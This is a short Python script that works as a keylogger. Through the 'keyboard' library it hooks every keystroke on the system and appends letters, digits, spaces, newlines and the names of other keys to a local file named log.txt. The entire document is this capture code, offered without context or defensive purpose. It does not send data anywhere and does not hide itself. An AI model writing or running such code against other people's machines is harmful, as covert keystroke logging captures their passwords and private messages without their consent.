import keyboard, os
key = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
def onPress(e):
  with open('log.txt', 'a') as f:
                if e.name== 'enter':
                        f.write('\n')
                if e.event_type=='down':
                        if e.name in key:
                                f.write(e.name)
                        if e.name=='space':
                                f.write(" ")
                        if e.name not in key and e.name!='enter' and e.name!='space':
                                f.write(f"\t{e.name}\n")
keyboard.hook(onPress)
    
